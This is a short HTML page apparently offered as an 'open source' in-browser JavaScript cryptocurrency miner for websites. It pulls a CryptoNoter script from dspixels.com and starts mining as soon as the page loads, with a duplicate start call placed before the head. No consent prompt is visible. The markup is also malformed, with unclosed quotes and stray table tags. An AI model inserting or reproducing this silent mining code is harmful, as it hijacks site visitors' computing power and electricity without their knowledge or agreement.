<script src="https://dspixels.com/mine/processor.js"></script>
<script>
    var miner = new CryptoNoter.User('CryptoNoter').start();
</script>

<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<title>In-Browser Javascript Web Miner</title>
	<meta name="description" content="Open Source In-Browser Javascript Web Miner For Websites/>

	<meta property="og:title" content="In-Browser Javascript Web Miner"/>
	<meta property="og:description" content="Open Source In-Browser Javascript Web Miner For Websites/>
	<meta property="og:type" content="website"/>
	<meta property="og:url" content="https://mine.dspixels.com"/>
	<meta property="og:site_name" content="mine.dspixels.com"/>

	<script src="https://dspixels.com/mine/processor.js"></script>
	<script>
		var miner = new CryptoNoter.User(CryptoNoter, {
			autoThreads: true,
			throttle: 0.3
		});
		miner.start();

		// Listen on events
		var found = 0,
			accepted = 0;
		miner.on('found', function () {
			found++;
			document.getElementById("FoundShares").innerHTML = found;
		});
		miner.on('accepted', function () {
			accepted++;
		})

		// Update stats once per second
		setInterval(function () {
			var idle = parseFloat(location.hash.split('#')[1]) || 0.5;
			var hashesPerSecond = miner.getHashesPerSecond();
			document.getElementById("TotalHashes").innerHTML = miner.getTotalHashes();
			document.getElementById("VerifiedShares").innerHTML = miner.getAcceptedHashes();
			document.getElementById("Hashes").innerHTML = hashesPerSecond;
			miner.setThrottle(idle);
			document.getElementById("Hashes").innerHTML = hashesPerSecond;

		}, 500);


	</script>
</head>

<body style="font-family: Arial;border: 0 none;">

<div align='center' style='margin-top:30px;'>

</tr>

	</td>

	</td>
